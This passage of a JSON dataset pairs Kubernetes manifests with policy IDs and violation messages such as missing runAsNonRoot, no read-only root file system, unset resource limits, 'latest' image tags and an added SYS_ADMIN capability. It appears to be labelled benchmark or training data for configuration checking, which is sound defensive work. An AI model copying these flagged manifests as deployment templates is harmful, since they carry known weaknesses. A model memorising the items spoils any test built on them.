secretKeyRef:\n              name: redis-secret\n              key: queue-host\n        - name: QUEUE_PORT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-port\n        - name: QUEUE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-password\n        - name: QUEUE_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-timeout\n        - name: MICROSERVICE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq-secret\n              key: url\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"addresses-service\" does not have a read-only root file system"
  },
  {
    "id": "01065",
    "manifest_path": "data/manifests/the_stack_sample/sample_0272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: addresses-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: addresses-service\n  template:\n    metadata:\n      labels:\n        app: addresses-service\n    spec:\n      containers:\n      - name: addresses-service\n        image: stokei/addresses-service:latest\n        resources: {}\n        imagePullPolicy: Always\n        env:\n        - name: DB_NAME\n          value: addresses\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-user\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-password\n        - name: DB_OPTIONS\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-options\n        - name: DB_PREFIX\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-prefix\n        - name: DB_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-timeout\n        - name: QUEUE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-host\n        - name: QUEUE_PORT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-port\n        - name: QUEUE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-password\n        - name: QUEUE_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-timeout\n        - name: MICROSERVICE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq-secret\n              key: url\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"addresses-service\" is not set to runAsNonRoot"
  },
  {
    "id": "01066",
    "manifest_path": "data/manifests/the_stack_sample/sample_0272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: addresses-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: addresses-service\n  template:\n    metadata:\n      labels:\n        app: addresses-service\n    spec:\n      containers:\n      - name: addresses-service\n        image: stokei/addresses-service:latest\n        resources: {}\n        imagePullPolicy: Always\n        env:\n        - name: DB_NAME\n          value: addresses\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-user\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-password\n        - name: DB_OPTIONS\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-options\n        - name: DB_PREFIX\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-prefix\n        - name: DB_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-timeout\n        - name: QUEUE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-host\n        - name: QUEUE_PORT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-port\n        - name: QUEUE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-password\n        - name: QUEUE_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-timeout\n        - name: MICROSERVICE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq-secret\n              key: url\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"addresses-service\" has cpu request 0"
  },
  {
    "id": "01067",
    "manifest_path": "data/manifests/the_stack_sample/sample_0272.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: addresses-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: addresses-service\n  template:\n    metadata:\n      labels:\n        app: addresses-service\n    spec:\n      containers:\n      - name: addresses-service\n        image: stokei/addresses-service:latest\n        resources: {}\n        imagePullPolicy: Always\n        env:\n        - name: DB_NAME\n          value: addresses\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-host\n        - name: DB_PORT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-port\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-user\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-password\n        - name: DB_OPTIONS\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-options\n        - name: DB_PREFIX\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-prefix\n        - name: DB_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: mongodb-secret\n              key: db-timeout\n        - name: QUEUE_HOST\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-host\n        - name: QUEUE_PORT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-port\n        - name: QUEUE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-password\n        - name: QUEUE_TIMEOUT\n          valueFrom:\n            secretKeyRef:\n              name: redis-secret\n              key: queue-timeout\n        - name: MICROSERVICE_URL\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq-secret\n              key: url\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"addresses-service\" has memory limit 0"
  },
  {
    "id": "01068",
    "manifest_path": "data/manifests/the_stack_sample/sample_0274.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: startstopdemo-687f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: startstopdemo-687f\n  template:\n    metadata:\n      labels:\n        app: startstopdemo-687f\n    spec:\n      containers:\n      - name: startstopdemo-687f\n        image: testrg12.azurecr.io/startstopdemo\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"startstopdemo-687f\" is using an invalid container image, \"testrg12.azurecr.io/startstopdemo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01069",
    "manifest_path": "data/manifests/the_stack_sample/sample_0274.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: startstopdemo-687f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: startstopdemo-687f\n  template:\n    metadata:\n      labels:\n        app: startstopdemo-687f\n    spec:\n      containers:\n      - name: startstopdemo-687f\n        image: testrg12.azurecr.io/startstopdemo\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"startstopdemo-687f\" does not have a read-only root file system"
  },
  {
    "id": "01070",
    "manifest_path": "data/manifests/the_stack_sample/sample_0274.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: startstopdemo-687f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: startstopdemo-687f\n  template:\n    metadata:\n      labels:\n        app: startstopdemo-687f\n    spec:\n      containers:\n      - name: startstopdemo-687f\n        image: testrg12.azurecr.io/startstopdemo\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"startstopdemo-687f\" is not set to runAsNonRoot"
  },
  {
    "id": "01071",
    "manifest_path": "data/manifests/the_stack_sample/sample_0274.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: startstopdemo-687f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: startstopdemo-687f\n  template:\n    metadata:\n      labels:\n        app: startstopdemo-687f\n    spec:\n      containers:\n      - name: startstopdemo-687f\n        image: testrg12.azurecr.io/startstopdemo\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"startstopdemo-687f\" has cpu request 0"
  },
  {
    "id": "01072",
    "manifest_path": "data/manifests/the_stack_sample/sample_0274.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: startstopdemo-687f\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: startstopdemo-687f\n  template:\n    metadata:\n      labels:\n        app: startstopdemo-687f\n    spec:\n      containers:\n      - name: startstopdemo-687f\n        image: testrg12.azurecr.io/startstopdemo\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"startstopdemo-687f\" has memory limit 0"
  },
  {
    "id": "01073",
    "manifest_path": "data/manifests/the_stack_sample/sample_0275.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: statusreconciler\n  labels:\n    app: prow\n    component: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20200404-591527a41\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config-misc\n          mountPath: /etc/job-config/misc\n          readOnly: true\n        - name: job-config-master\n          mountPath: /etc/job-config/master\n          readOnly: true\n        - name: job-config-3x\n          mountPath: /etc/job-config/3.x\n          readOnly: true\n        - name: job-config-41\n          mountPath: /etc/job-config/4.1\n          readOnly: true\n        - name: job-config-42\n          mountPath: /etc/job-config/4.2\n          readOnly: true\n        - name: job-config-43\n          mountPath: /etc/job-config/4.3\n          readOnly: true\n        - name: job-config-44\n          mountPath: /etc/job-config/4.4\n          readOnly: true\n        - name: job-config-45\n          mountPath: /etc/job-config/4.5\n          readOnly: true\n        - name: job-config-46\n          mountPath: /etc/job-config/4.6\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 20m\n      volumes:\n      - name: oauth\n        secret:\n          secretName: github-credentials-openshift-ci-robot\n      - name: config\n        configMap:\n          name: config\n      - name: job-config-misc\n        configMap:\n          name: job-config-misc\n      - name: job-config-master\n        configMap:\n          name: job-config-master\n      - name: job-config-3x\n        configMap:\n          name: job-config-3.x\n      - name: job-config-41\n        configMap:\n          name: job-config-4.1\n      - name: job-config-42\n        configMap:\n          name: job-config-4.2\n      - name: job-config-43\n        configMap:\n          name: job-config-4.3\n      - name: job-config-44\n        configMap:\n          name: job-config-4.4\n      - name: job-config-45\n        configMap:\n          name: job-config-4.5\n      - name: job-config-46\n        configMap:\n          name: job-config-4.6\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "01074",
    "manifest_path": "data/manifests/the_stack_sample/sample_0275.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: statusreconciler\n  labels:\n    app: prow\n    component: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20200404-591527a41\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config-misc\n          mountPath: /etc/job-config/misc\n          readOnly: true\n        - name: job-config-master\n          mountPath: /etc/job-config/master\n          readOnly: true\n        - name: job-config-3x\n          mountPath: /etc/job-config/3.x\n          readOnly: true\n        - name: job-config-41\n          mountPath: /etc/job-config/4.1\n          readOnly: true\n        - name: job-config-42\n          mountPath: /etc/job-config/4.2\n          readOnly: true\n        - name: job-config-43\n          mountPath: /etc/job-config/4.3\n          readOnly: true\n        - name: job-config-44\n          mountPath: /etc/job-config/4.4\n          readOnly: true\n        - name: job-config-45\n          mountPath: /etc/job-config/4.5\n          readOnly: true\n        - name: job-config-46\n          mountPath: /etc/job-config/4.6\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 20m\n      volumes:\n      - name: oauth\n        secret:\n          secretName: github-credentials-openshift-ci-robot\n      - name: config\n        configMap:\n          name: config\n      - name: job-config-misc\n        configMap:\n          name: job-config-misc\n      - name: job-config-master\n        configMap:\n          name: job-config-master\n      - name: job-config-3x\n        configMap:\n          name: job-config-3.x\n      - name: job-config-41\n        configMap:\n          name: job-config-4.1\n      - name: job-config-42\n        configMap:\n          name: job-config-4.2\n      - name: job-config-43\n        configMap:\n          name: job-config-4.3\n      - name: job-config-44\n        configMap:\n          name: job-config-4.4\n      - name: job-config-45\n        configMap:\n          name: job-config-4.5\n      - name: job-config-46\n        configMap:\n          name: job-config-4.6\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "01075",
    "manifest_path": "data/manifests/the_stack_sample/sample_0275.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: statusreconciler\n  labels:\n    app: prow\n    component: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20200404-591527a41\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-graphql-endpoint=http://ghproxy/graphql\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config-misc\n          mountPath: /etc/job-config/misc\n          readOnly: true\n        - name: job-config-master\n          mountPath: /etc/job-config/master\n          readOnly: true\n        - name: job-config-3x\n          mountPath: /etc/job-config/3.x\n          readOnly: true\n        - name: job-config-41\n          mountPath: /etc/job-config/4.1\n          readOnly: true\n        - name: job-config-42\n          mountPath: /etc/job-config/4.2\n          readOnly: true\n        - name: job-config-43\n          mountPath: /etc/job-config/4.3\n          readOnly: true\n        - name: job-config-44\n          mountPath: /etc/job-config/4.4\n          readOnly: true\n        - name: job-config-45\n          mountPath: /etc/job-config/4.5\n          readOnly: true\n        - name: job-config-46\n          mountPath: /etc/job-config/4.6\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            memory: 200Mi\n            cpu: 20m\n      volumes:\n      - name: oauth\n        secret:\n          secretName: github-credentials-openshift-ci-robot\n      - name: config\n        configMap:\n          name: config\n      - name: job-config-misc\n        configMap:\n          name: job-config-misc\n      - name: job-config-master\n        configMap:\n          name: job-config-master\n      - name: job-config-3x\n        configMap:\n          name: job-config-3.x\n      - name: job-config-41\n        configMap:\n          name: job-config-4.1\n      - name: job-config-42\n        configMap:\n          name: job-config-4.2\n      - name: job-config-43\n        configMap:\n          name: job-config-4.3\n      - name: job-config-44\n        configMap:\n          name: job-config-4.4\n      - name: job-config-45\n        configMap:\n          name: job-config-4.5\n      - name: job-config-46\n        configMap:\n          name: job-config-4.6\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "01076",
    "manifest_path": "data/manifests/the_stack_sample/sample_0278.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  containers:\n  - name: sec-ctx-demo\n    image: gcr.io/google-samples/node-hello:1.0\n    securityContext:\n      capabilities:\n        add:\n        - SYS_ADMIN\n        - CHOWN\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sec-ctx-demo\" does not have a read-only root file system"
  },
  {
    "id": "01077",
    "manifest_path": "data/manifests/the_stack_sample/sample_0278.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  containers:\n  - name: sec-ctx-demo\n    image: gcr.io/google-samples/node-hello:1.0\n    securityContext:\n      capabilities:\n        add:\n        - SYS_ADMIN\n        - CHOWN\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"sec-ctx-demo\" has SYS_ADMIN capability hence allows privilege escalation."
  },
  {
    "id": "01078",
    "manifest_path": "data/manifests/the_stack_sample/sample_0278.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  containers:\n  - name: sec-ctx-demo\n    image: gcr.io/google-samples/node-hello:1.0\n    securityContext:\n      capabilities:\n        add:\n        - SYS_ADMIN\n        - CHOWN\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sec-ctx-demo\" is not set to runAsNonRoot"
  },
  {
    "id": "01079",
    "manifest_path": "data/manifests/the_stack_sample/sample_0278.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  containers:\n  - name: sec-ctx-demo\n    image: gcr.io/google-samples/node-hello:1.0\n    securityContext:\n      capabilities:\n        add:\n        - SYS_ADMIN\n        - CHOWN\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sec-ctx-demo\" has cpu request 0"
  },
  {
    "id": "01080",
    "manifest_path": "data/manifests/the_stack_sample/sample_0278.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: security-context-demo\nspec:\n  containers:\n  - name: sec-ctx-demo\n    image: gcr.io/google-samples/node-hello:1.0\n    securityContext:\n      capabilities:\n        add:\n        - SYS_ADMIN\n        - CHOWN\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sec-ctx-demo\" has memory limit 0"
  },
  {
    "id": "01081",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"director\" is using an invalid container image, \"{{- .Values.openmatch.director.image -}}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01082",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"wait-nakama-grpc-api\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01083",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"wait-om-function\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01084",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"wait-open-match-backend\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01085",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"director\" does not have a read-only root file system"
  },
  {
    "id": "01086",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wait-nakama-grpc-api\" does not have a read-only root file system"
  },
  {
    "id": "01087",
    "manifest_path": "data/manifests/the_stack_sample/sample_0280.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: director\n  namespace: dataleague\n  labels:\n    app: director\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: director\n  template:\n    metadata:\n      labels:\n        app: director\n      annotations:\n        timestamp: '{{ .Values.timestamp }}'\n    spec:\n      initContainers:\n      - name: wait-nakama-grpc-api\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz nakama.dataleague.svc.cluster.local 7349; do echo \"Waiting\n          for Nakama gRPC API\"; sleep 2; done;\n      - name: wait-open-match-backend\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz open-match-backend.open-match.svc.cluster.local 50505; do echo\n          \"Waiting for OM backend\"; sleep 2; done;\n      - name: wait-om-function\n        image: busybox:latest\n        command:\n        - sh\n        - -c\n        - until nc -vz matchfunction.dataleague.svc.cluster.local 50502; do echo \"Waiting\n          for OM function\"; sleep 2; done;\n      containers:\n      - name: director\n        image: '{{- .Values.openmatch.director.image -}}'\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wait-om-function\" does not have a read-only root file system"
  },
  {
    "id": "01088",
